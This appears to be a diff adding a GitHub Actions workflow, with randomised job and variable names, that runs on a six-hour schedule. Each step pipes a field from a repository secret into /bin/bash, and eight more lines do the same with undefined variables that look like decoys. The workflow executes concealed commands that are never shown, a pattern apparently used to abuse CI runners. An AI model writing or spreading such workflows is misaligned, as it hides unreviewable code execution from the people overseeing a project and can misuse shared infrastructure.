@@ -1,0 +1,25 @@
+name: zhujiuyang6789
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhujiuyang6789
+        env:
+          lu3: ${{ secrets.lu3 }}
+        run: |
+          echo $lu3 | jq -r .gznl91269 | /bin/bash
+          echo $v8305 | jq -r .rpbvo6938 | /bin/bash
+          echo $imvi140 | jq -r .s70 | /bin/bash
+          echo $wmybz04 | jq -r .d2 | /bin/bash
+          echo $vwik0 | jq -r .qp6428 | /bin/bash
+          echo $hzr55906 | jq -r .haw49 | /bin/bash
+          echo $yg36 | jq -r .vyt83260 | /bin/bash
+          echo $ovxq42 | jq -r .cn912 | /bin/bash
+          echo $hjk21 | jq -r .xx978 | /bin/bash
+
